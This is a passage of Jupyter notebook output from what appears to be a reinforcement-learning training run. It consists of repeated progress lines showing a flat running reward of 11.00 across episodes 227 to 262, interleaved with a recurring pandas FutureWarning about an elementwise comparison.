      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 227\t Frame count: 115500\t Context: 1\n",
      "Running reward: 11.00\t Episode 228\t Frame count: 115600\t Context: 1\n",
      "Running reward: 11.00\t Episode 228\t Frame count: 115700\t Context: 2\n",
      "Running reward: 11.00\t Episode 229\t Frame count: 115800\t Context: 2\n",
      "Running reward: 11.00\t Episode 229\t Frame count: 115900\t Context: 2\n",
      "Running reward: 11.00\t Episode 229\t Frame count: 116000\t Context: 2\n",
      "Running reward: 11.00\t Episode 229\t Frame count: 116100\t Context: 2\n",
      "Running reward: 11.00\t Episode 230\t Frame count: 116200\t Context: 1\n",
      "Running reward: 11.00\t Episode 230\t Frame count: 116300\t Context: 1\n",
      "Running reward: 11.00\t Episode 230\t Frame count: 116400\t Context: 1\n",
      "Running reward: 11.00\t Episode 230\t Frame count: 116500\t Context: 1\n",
      "Running reward: 11.00\t Episode 230\t Frame count: 116600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 230\t Frame count: 116700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 230\t Frame count: 116800\t Context: 1\n",
      "Running reward: 11.00\t Episode 230\t Frame count: 116900\t Context: 2\n",
      "Running reward: 11.00\t Episode 230\t Frame count: 117000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 232\t Frame count: 117100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 232\t Frame count: 117200\t Context: 1\n",
      "Running reward: 11.00\t Episode 232\t Frame count: 117300\t Context: 1\n",
      "Running reward: 11.00\t Episode 232\t Frame count: 117400\t Context: 1\n",
      "Running reward: 11.00\t Episode 232\t Frame count: 117500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 233\t Frame count: 117600\t Context: 2\n",
      "Running reward: 11.00\t Episode 234\t Frame count: 117700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 234\t Frame count: 117800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 234\t Frame count: 117900\t Context: 1\n",
      "Running reward: 11.00\t Episode 234\t Frame count: 118000\t Context: 1\n",
      "Running reward: 11.00\t Episode 234\t Frame count: 118100\t Context: 1\n",
      "Running reward: 11.00\t Episode 234\t Frame count: 118200\t Context: 2\n",
      "Running reward: 11.00\t Episode 235\t Frame count: 118300\t Context: 1\n",
      "Running reward: 11.00\t Episode 235\t Frame count: 118400\t Context: 1\n",
      "Running reward: 11.00\t Episode 235\t Frame count: 118500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 235\t Frame count: 118600\t Context: 2\n",
      "Running reward: 11.00\t Episode 235\t Frame count: 118700\t Context: 2\n",
      "Running reward: 11.00\t Episode 235\t Frame count: 118800\t Context: 2\n",
      "Running reward: 11.00\t Episode 235\t Frame count: 118900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 235\t Frame count: 119000\t Context: 2\n",
      "Running reward: 11.00\t Episode 236\t Frame count: 119100\t Context: 1\n",
      "Running reward: 11.00\t Episode 236\t Frame count: 119200\t Context: 1\n",
      "Running reward: 11.00\t Episode 236\t Frame count: 119300\t Context: 2\n",
      "Running reward: 11.00\t Episode 236\t Frame count: 119400\t Context: 2\n",
      "Running reward: 11.00\t Episode 236\t Frame count: 119500\t Context: 2\n",
      "Running reward: 11.00\t Episode 236\t Frame count: 119600\t Context: 2\n",
      "Running reward: 11.00\t Episode 237\t Frame count: 119700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 237\t Frame count: 119800\t Context: 1\n",
      "Running reward: 11.00\t Episode 237\t Frame count: 119900\t Context: 1\n",
      "Running reward: 11.00\t Episode 237\t Frame count: 120000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 237\t Frame count: 120100\t Context: 1\n",
      "Running reward: 11.00\t Episode 237\t Frame count: 120200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 237\t Frame count: 120300\t Context: 2\n",
      "Running reward: 11.00\t Episode 237\t Frame count: 120400\t Context: 2\n",
      "Running reward: 11.00\t Episode 237\t Frame count: 120500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 237\t Frame count: 120600\t Context: 2\n",
      "Running reward: 11.00\t Episode 238\t Frame count: 120700\t Context: 1\n",
      "Running reward: 11.00\t Episode 238\t Frame count: 120800\t Context: 1\n",
      "Running reward: 11.00\t Episode 238\t Frame count: 120900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 238\t Frame count: 121000\t Context: 2\n",
      "Running reward: 11.00\t Episode 238\t Frame count: 121100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 238\t Frame count: 121200\t Context: 2\n",
      "Running reward: 11.00\t Episode 239\t Frame count: 121300\t Context: 1\n",
      "Running reward: 11.00\t Episode 239\t Frame count: 121400\t Context: 2\n",
      "Running reward: 11.00\t Episode 240\t Frame count: 121500\t Context: 1\n",
      "Running reward: 11.00\t Episode 240\t Frame count: 121600\t Context: 1\n",
      "Running reward: 11.00\t Episode 240\t Frame count: 121700\t Context: 1\n",
      "Running reward: 11.00\t Episode 240\t Frame count: 121800\t Context: 2\n",
      "Running reward: 11.00\t Episode 241\t Frame count: 121900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 242\t Frame count: 122000\t Context: 1\n",
      "Running reward: 11.00\t Episode 242\t Frame count: 122100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 242\t Frame count: 122200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 242\t Frame count: 122300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 242\t Frame count: 122400\t Context: 1\n",
      "Running reward: 11.00\t Episode 243\t Frame count: 122500\t Context: 1\n",
      "Running reward: 11.00\t Episode 243\t Frame count: 122600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 243\t Frame count: 122700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 244\t Frame count: 122800\t Context: 2\n",
      "Running reward: 11.00\t Episode 244\t Frame count: 122900\t Context: 2\n",
      "Running reward: 11.00\t Episode 245\t Frame count: 123000\t Context: 1\n",
      "Running reward: 11.00\t Episode 245\t Frame count: 123100\t Context: 1\n",
      "Running reward: 11.00\t Episode 245\t Frame count: 123200\t Context: 1\n",
      "Running reward: 11.00\t Episode 245\t Frame count: 123300\t Context: 1\n",
      "Running reward: 11.00\t Episode 245\t Frame count: 123400\t Context: 2\n",
      "Running reward: 11.00\t Episode 245\t Frame count: 123500\t Context: 2\n",
      "Running reward: 11.00\t Episode 246\t Frame count: 123600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 247\t Frame count: 123700\t Context: 1\n",
      "Running reward: 11.00\t Episode 247\t Frame count: 123800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 247\t Frame count: 123900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 247\t Frame count: 124000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 248\t Frame count: 124100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 248\t Frame count: 124200\t Context: 1\n",
      "Running reward: 11.00\t Episode 248\t Frame count: 124300\t Context: 1\n",
      "Running reward: 11.00\t Episode 248\t Frame count: 124400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 248\t Frame count: 124500\t Context: 2\n",
      "Running reward: 11.00\t Episode 249\t Frame count: 124600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 249\t Frame count: 124700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 250\t Frame count: 124800\t Context: 1\n",
      "Running reward: 11.00\t Episode 250\t Frame count: 124900\t Context: 2\n",
      "Running reward: 11.00\t Episode 251\t Frame count: 125000\t Context: 1\n",
      "Running reward: 11.00\t Episode 251\t Frame count: 125100\t Context: 2\n",
      "Running reward: 11.00\t Episode 252\t Frame count: 125200\t Context: 1\n",
      "Running reward: 11.00\t Episode 252\t Frame count: 125300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 252\t Frame count: 125400\t Context: 1\n",
      "Running reward: 11.00\t Episode 252\t Frame count: 125500\t Context: 1\n",
      "Running reward: 11.00\t Episode 252\t Frame count: 125600\t Context: 1\n",
      "Running reward: 11.00\t Episode 252\t Frame count: 125700\t Context: 1\n",
      "Running reward: 11.00\t Episode 252\t Frame count: 125800\t Context: 1\n",
      "Running reward: 11.00\t Episode 252\t Frame count: 125900\t Context: 1\n",
      "Running reward: 11.00\t Episode 252\t Frame count: 126000\t Context: 2\n",
      "Running reward: 11.00\t Episode 253\t Frame count: 126100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 253\t Frame count: 126200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 253\t Frame count: 126300\t Context: 1\n",
      "Running reward: 11.00\t Episode 253\t Frame count: 126400\t Context: 1\n",
      "Running reward: 11.00\t Episode 253\t Frame count: 126500\t Context: 2\n",
      "Running reward: 11.00\t Episode 254\t Frame count: 126600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 254\t Frame count: 126700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 255\t Frame count: 126800\t Context: 1\n",
      "Running reward: 11.00\t Episode 255\t Frame count: 126900\t Context: 2\n",
      "Running reward: 11.00\t Episode 255\t Frame count: 127000\t Context: 2\n",
      "Running reward: 11.00\t Episode 256\t Frame count: 127100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 256\t Frame count: 127200\t Context: 1\n",
      "Running reward: 11.00\t Episode 256\t Frame count: 127300\t Context: 2\n",
      "Running reward: 11.00\t Episode 256\t Frame count: 127400\t Context: 2\n",
      "Running reward: 11.00\t Episode 257\t Frame count: 127500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 257\t Frame count: 127600\t Context: 2\n",
      "Running reward: 11.00\t Episode 257\t Frame count: 127700\t Context: 2\n",
      "Running reward: 11.00\t Episode 257\t Frame count: 127800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 258\t Frame count: 127900\t Context: 1\n",
      "Running reward: 11.00\t Episode 258\t Frame count: 128000\t Context: 1\n",
      "Running reward: 11.00\t Episode 259\t Frame count: 128100\t Context: 1\n",
      "Running reward: 11.00\t Episode 259\t Frame count: 128200\t Context: 1\n",
      "Running reward: 11.00\t Episode 259\t Frame count: 128300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 259\t Frame count: 128400\t Context: 2\n",
      "Running reward: 11.00\t Episode 259\t Frame count: 128500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 259\t Frame count: 128600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 260\t Frame count: 128700\t Context: 2\n",
      "Running reward: 11.00\t Episode 261\t Frame count: 128800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 261\t Frame count: 128900\t Context: 2\n",
      "Running reward: 11.00\t Episode 261\t Frame count: 129000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 261\t Frame count: 129100\t Context: 2\n",
      "Running reward: 11.00\t Episode 262\t Frame count: 129200\t Context: 1\n",
      "Running reward: 11.00\t Episode 262\t Frame count: 129300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 262\t Frame count: 129400\t Context: 2\n",
      "Running reward: 11.00\t Episode 262\t Frame count: 129500\t Context: 2\n",
      "Running reward: 11.00\t Episode 262\t Frame count: 129600\t Context: 2\n",
      "Running reward: 11.00\t Episode 262\t Frame count: 129700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
